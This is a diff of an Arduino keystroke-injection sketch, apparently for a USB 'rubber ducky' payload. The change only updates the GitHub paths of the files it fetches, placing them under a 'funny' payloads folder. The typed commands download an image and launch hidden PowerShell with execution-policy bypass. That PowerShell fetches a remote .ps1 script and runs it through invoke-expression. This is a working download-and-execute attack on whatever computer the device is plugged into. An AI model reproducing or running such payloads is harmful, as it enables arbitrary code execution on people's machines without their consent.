@@ -14,7 +14,7 @@ void loop() {
   keyboard.releaseKey();
   delay(1500);
 
-  keyboard.println("Invoke-WebRequest -Uri https://github.com/P-ict0/duckyINO/blob/main/francer/france.png?raw=true -OutFile france.png;exit");
+  keyboard.println("Invoke-WebRequest -Uri https://github.com/P-ict0/duckyINO/blob/main/payloads/funny/francer/france.png?raw=true -OutFile france.png;exit");
 
   delay(800);
 
@@ -22,7 +22,7 @@ void loop() {
 
   delay(1500);
 
-  keyboard.println("powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/P-ict0/duckyINO/main/francer/francer.ps1?dl=1; invoke-expression $pl");
+  keyboard.println("powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/P-ict0/duckyINO/main/payloads/funny/francer/francer.ps1?dl=1; invoke-expression $pl");
 
   delay(1500);
 
